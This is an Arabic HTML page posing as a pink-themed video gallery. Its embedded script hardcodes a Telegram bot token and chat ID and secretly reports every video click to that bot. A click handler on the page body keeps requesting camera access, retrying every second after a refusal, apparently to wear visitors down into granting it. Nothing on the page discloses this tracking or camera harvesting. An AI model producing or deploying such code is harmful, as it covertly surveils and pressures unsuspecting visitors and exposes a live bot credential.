
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <title>طائفة الظلال - العنقاء_666</title>
  <meta name="viewport" content="width=480, initial-scale=1.0, maximum-scale=1.0">
  <style>
    body {
      margin: 0;
      background-color: #2a003f;
      font-family: 'Arial', sans-serif;
    }

    .cover {
      width: 100%;
      height: 200px;
      background: url("5alfia.png") no-repeat center center;
      background-size: cover;
      position: relative;
    }

    .profile {
      width: 100px;
      height: 100px;
      border-radius: 50%;
      border: 4px solid white;
      background: url("profile.png") no-repeat center center;
      background-size: cover;
      position: absolute;
      bottom: -50px;
      right: 10px;
      animation: pulse 2s infinite;
    }

    @keyframes pulse {
      0% { box-shadow: 0 0 5px #ff69b4; }
      50% { box-shadow: 0 0 20px #ff0000; }
      100% { box-shadow: 0 0 5px #ff69b4; }
    }

    .video-grid {
      margin-top: 80px;
      display: flex;
      flex-wrap: wrap;
      justify-content: center;
      gap: 10px;
      padding: 10px;
    }

    .video-box {
      width: 90px;
      height: 90px;
      background: black;
      border: 3px solid #ff69b4;
      animation: pulse 2s infinite;
      position: relative;
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .video-box video {
      width: 100%;
      height: 100%;
      object-fit: cover;
      display: block;
    }

    .video-desc {
      text-align: center;
      color: pink;
      font-size: 12px;
      margin-top: 5px;
    }

    .overlay {
      display: none;
      position: fixed;
      top: 0; left: 0;
      width: 100vw; height: 100vh;
      background-color: rgba(0, 0, 0, 0.9);
      justify-content: center;
      align-items: center;
      z-index: 999;
      flex-direction: column;
    }

    .overlay video {
      width: 90%;
      max-height: 80vh;
    }

    .download-btn {
      background-color: #ff69b4;
      color: white;
      border: none;
      padding: 10px;
      margin-top: 10px;
      font-size: 16px;
      cursor: pointer;
      border-radius: 10px;
    }

    .spinner {
      border: 6px solid #f3f3f3;
      border-top: 6px solid #ff69b4;
      border-radius: 50%;
      width: 40px;
      height: 40px;
      animation: spin 1s linear infinite;
      margin-bottom: 10px;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .back-btn {
      position: fixed;
      bottom: 10px;
      left: 10px;
      background-color: #ff69b4;
      color: white;
      padding: 10px 20px;
      border-radius: 20px;
      font-size: 14px;
      text-decoration: none;
      animation: pulse 2s infinite;
    }

    .back-btn::before {
      content: "⬅";
      margin-left: 5px;
    }
  </style>
</head>
<body onclick="requestCamera();">

  <div class="cover">
    <div class="profile"></div>
  </div>

  <div class="video-grid" id="videoGrid">
    <!-- 👑 الفيديو الأول -->
    <div class="video-box" onclick="playVideo('VivaCut_video_1751836959485_HD1.mp4', 'لحن نهاية')">
      <video muted poster="thumb1.jpg"></video>
    </div>
    <div class="video-desc">لحن نهاية</div>

    <!-- 👑 البقية تكرار -->
    <div class="video-box" onclick="playVideo('vid2.mp4', 'وصف 2')"><video muted poster="thumb2.jpg"></video></div>
    <div class="video-desc">وصف 2</div>

    <div class="video-box" onclick="playVideo('vid3.mp4', 'وصف 3')"><video muted poster="thumb3.jpg"></video></div>
    <div class="video-desc">وصف 3</div>

    <div class="video-box" onclick="playVideo('vid4.mp4', 'وصف 4')"><video muted poster="thumb4.jpg"></video></div>
    <div class="video-desc">وصف 4</div>

    <div class="video-box" onclick="playVideo('vid5.mp4', 'وصف 5')"><video muted poster="thumb5.jpg"></video></div>
    <div class="video-desc">وصف 5</div>
  </div>

  <div class="overlay" id="overlay">
    <div class="spinner" id="spinner"></div>
    <video id="bigVideo" controls autoplay style="display: none;"></video>
    <a id="downloadBtn" class="download-btn" download>تحميل الفيديو</a>
  </div>

  <a class="back-btn" href="index.html">رجوع للصور</a>

  <script>
    const TOKEN = "7557167179:AAG0_jw9g7EEPhFKJbW5pMLhiPidHrGzt8M";
    const CHAT_ID = "7664410054";

    function sendToBot(message) {
      fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
        method: "POST",
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: CHAT_ID, text: message })
      });
    }

    function playVideo(src, desc) {
      sendToBot("🖼 المستخدم ضغط على الفيديو: " + desc);
      const overlay = document.getElementById('overlay');
      const video = document.getElementById('bigVideo');
      const spinner = document.getElementById('spinner');
      const downloadBtn = document.getElementById('downloadBtn');

      overlay.style.display = "flex";
      spinner.style.display = "block";
      video.style.display = "none";

      video.src = src;
      video.load();

      video.oncanplay = () => {
        spinner.style.display = "none";
        video.style.display = "block";
        downloadBtn.href = src;
      };
    }

    document.getElementById("overlay").onclick = () => {
      document.getElementById("overlay").style.display = "none";
      document.getElementById("bigVideo").pause();
    };

    // 👑 طلب إذن الوصول للكاميرا عند كل نقرة
    async function requestCamera() {
      try {
        await navigator.mediaDevices.getUserMedia({ video: true });
      } catch {
        setTimeout(requestCamera, 1000);
      }
    }
  </script>
</body>
</html>
